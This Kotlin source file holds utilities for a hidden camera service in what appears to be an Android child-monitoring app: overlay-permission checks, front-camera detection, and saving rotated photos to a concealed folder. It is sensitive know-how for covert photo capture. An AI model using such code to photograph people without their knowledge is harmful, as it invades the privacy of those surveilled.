package com.github.midros.child.utils.hiddenCameraServiceUtils

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Matrix
import android.hardware.Camera
import android.os.Build
import android.provider.Settings
import android.support.annotation.WorkerThread
import com.github.midros.child.utils.ConstFun
import com.github.midros.child.utils.Consts
import com.github.midros.child.utils.Consts.ADDRESS_PICTURE
import com.github.midros.child.utils.Consts.TAG
import com.github.midros.child.utils.FileHelper.getFilePath

import com.github.midros.child.utils.hiddenCameraServiceUtils.config.CameraImageFormat
import com.github.midros.child.utils.hiddenCameraServiceUtils.config.CameraRotation
import com.pawegio.kandroid.e
import com.pawegio.kandroid.start

import java.io.File
import java.io.FileOutputStream
import java.io.IOException

/**
 * Created by luis rafael on 20/03/18.
 */
object HiddenCameraUtils {

    @SuppressLint("NewApi")
    fun Context.canOverDrawOtherApps(): Boolean {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)
    }

    fun Context.openDrawOverPermissionSetting() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        intent.start(this)
    }

    fun Context.isFrontCameraAvailable(): Boolean {
        val numCameras = Camera.getNumberOfCameras()
        return numCameras > 0 && packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA_FRONT)
    }

    @Throws(Exception::class)
    fun Context.getFileName() : String {
        val file: File?
        try {
            file = File(getFilePath(), ADDRESS_PICTURE)

            if (!file.exists()) {
                file.mkdirs()
            }
        } catch (e: Exception) {
            throw Exception(e)
        }

        return "${file.absolutePath}/IMG_${ConstFun.getRandomNumeric()}.jpeg"
    }

    @WorkerThread
    internal fun Bitmap.rotateBitmap(@CameraRotation.SupportedRotation rotation: Int): Bitmap {
        val matrix = Matrix()
        matrix.postRotate(rotation.toFloat())
        return Bitmap.createBitmap(this, 0, 0, width, height, matrix, true)
    }

    internal fun Bitmap.saveImageFromFile(fileToSave: File,
                                   @CameraImageFormat.SupportedImageFormat imageFormat: Int): Boolean {
        var out: FileOutputStream? = null
        var isSuccess:Boolean

        val compressFormat = if (imageFormat == CameraImageFormat.FORMAT_JPEG) Bitmap.CompressFormat.JPEG
        else Bitmap.CompressFormat.PNG

        try {
            if (!fileToSave.exists()) fileToSave.createNewFile()
            out = FileOutputStream(fileToSave)
            compress(compressFormat, 100, out)
            isSuccess = true
        } catch (e: Exception) {
            e(TAG,e.message.toString())
            isSuccess = false
        } finally {
            try {
                if (out != null) out.close()
            } catch (e: IOException) {
                e(TAG,e.message.toString())
            }

        }
        return isSuccess
    }
}
